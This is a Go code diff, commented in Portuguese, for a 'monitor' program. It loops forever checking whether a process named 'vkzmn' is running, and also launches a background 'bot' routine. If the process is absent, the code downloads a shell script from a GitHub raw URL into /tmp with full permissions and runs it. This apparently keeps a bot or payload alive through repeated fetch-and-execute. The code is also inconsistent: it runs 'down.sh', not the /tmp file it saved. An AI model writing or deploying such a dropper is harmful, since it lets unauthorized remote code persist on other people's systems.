@@ -7,9 +7,31 @@ import (
 	"strings"
 	"time"
         "net/http"
+         "os/exec"
 )
 
+
 //esse e o monitor ele ficara em um loop infinito  verificando se  o vkzmn esta em execucao
+
+
+
+
+
+func  exec_vkzmn() {
+
+
+
+ 
+down_exec :=  exec.Command("sh"  , "down.sh" ) 
+
+
+go down_exec.Run()
+
+
+
+}
+
+
 
 
 func down_vkzmn(){
@@ -18,7 +40,7 @@ fmt.Println("abaixando vkzmn")
 
 cli := http.Client{}
 
-resp , err_get := cli.Get("https://github.com/atilabyte/IA/raw/refs/heads/main/down.sh")
+resp , err_get := cli.Get("https://github.com/atilabyte/golang/raw/refs/heads/master/down.sh")
 
  if err_get != nil {
 
@@ -40,17 +62,11 @@ resp , err_get := cli.Get("https://github.com/atilabyte/IA/raw/refs/heads/main/d
         }
 
 
- ioutil.WriteFile("down.sh" , script , 0777 )
+ ioutil.WriteFile("/tmp/down_vkzmn.sh" , script , 0777 )
 
-
+  
 
 }
-
-
-
-
-
-
 
 
 
@@ -60,13 +76,13 @@ func main() {
 
 
 
-
 main_func:
 
 
+        go bot()
 
 
-	time.Sleep(1 * time.Second)
+	time.Sleep(5 * time.Second)
 
 	var vkzmn_ok int = 0
 
@@ -109,7 +125,10 @@ main_func:
 
                          fmt.Println(str_proc)
 
+
 		}
+
+
 	}
 
 
@@ -117,7 +136,9 @@ main_func:
 
 	if vkzmn_ok == 23 {
                      
+
 		fmt.Println("vkzmn em execucao")
+
 
 
 	} else {
@@ -126,25 +147,34 @@ main_func:
 		fmt.Println("vkzmn nao ta em execucao")
 
 
-                 _, err :=  os.Open("/tmp/vkzmn")
-	         
-
-                       if err  != nil  {
+                    _, err_open :=   os.Open("/tmp/down_vkzmn.sh")  
 
 
-                                fmt.Println("vkzmn nao esta em /tmp" )    
+                        if  err_open != nil { 
+                     
+                            fmt.Println("down_vkzmn.sh nao foi abaixado")
+
+                            down_vkzmn()
+  
 
 
-                                   down_vkzmn() 
-                                
+                          } else {
 
-                      }
+
+                             fmt.Println("down_vkzmn.sh ja esta em //tmp" )
+                                          
+                             exec_vkzmn()
+
+
+                       }
+
 
 
 
 
 
 	}
+
 
 	goto main_func
 
